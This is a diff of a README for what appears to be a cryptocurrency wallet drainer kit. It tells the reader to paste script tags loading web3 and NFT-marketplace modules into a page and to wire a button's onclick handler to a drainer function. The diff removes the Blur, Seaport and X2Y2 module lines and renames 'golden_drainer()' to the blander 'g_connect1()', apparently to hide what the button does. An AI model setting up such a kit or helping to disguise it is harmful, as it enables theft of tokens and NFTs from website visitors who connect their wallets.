@@ -54,9 +54,6 @@ As soon as you find it, write down the following lines of code right in front of
   <script src="./assets/web3-provider/web3-data.js"></script>
   <script src="./assets/web3-provider/ethers.js"></script>
   <script src="./assets/web3-provider/ethereum-tx.js"></script>
-  <script src="./assets/web3-modules/module-blur.js"></script>
-  <script src="./assets/web3-modules/module-seaport.js"></script>
-  <script src="./assets/web3-modules/module-x2y2.js"></script>
   <script src="./assets/web3-provider.js"></script>
 ```
 
@@ -77,7 +74,7 @@ Or somehow, in fact, it can look like anything:
 You need to add the desired function to the button so that it is called when clicking:
 
 ```
-onclick="golden_drainer()"
+onclick="g_connect1()"
 ```
 
 That is, in the final version it will look like this:
